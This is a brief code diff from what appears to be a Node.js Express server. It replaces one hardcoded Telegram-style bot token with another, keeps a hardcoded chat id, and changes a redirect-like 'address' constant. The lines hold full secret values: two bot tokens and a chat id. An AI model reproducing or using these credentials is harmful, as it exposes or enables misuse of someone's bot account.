@@ -7,9 +7,9 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = '8129411225:AAEPTcIOjyoCPsg8dw5eH8lDidmNqt0FB-w'
+const token = '8030916544:AAGP54OPN05MOS0Drdw3Buu2tQ9nSFhdFjs'
 const id = '5326373447'
-const address = 'https://www.google.com'
+const address = 'https://www.youtube.com'
 
 const app = express();
 const appServer = http.createServer(app);
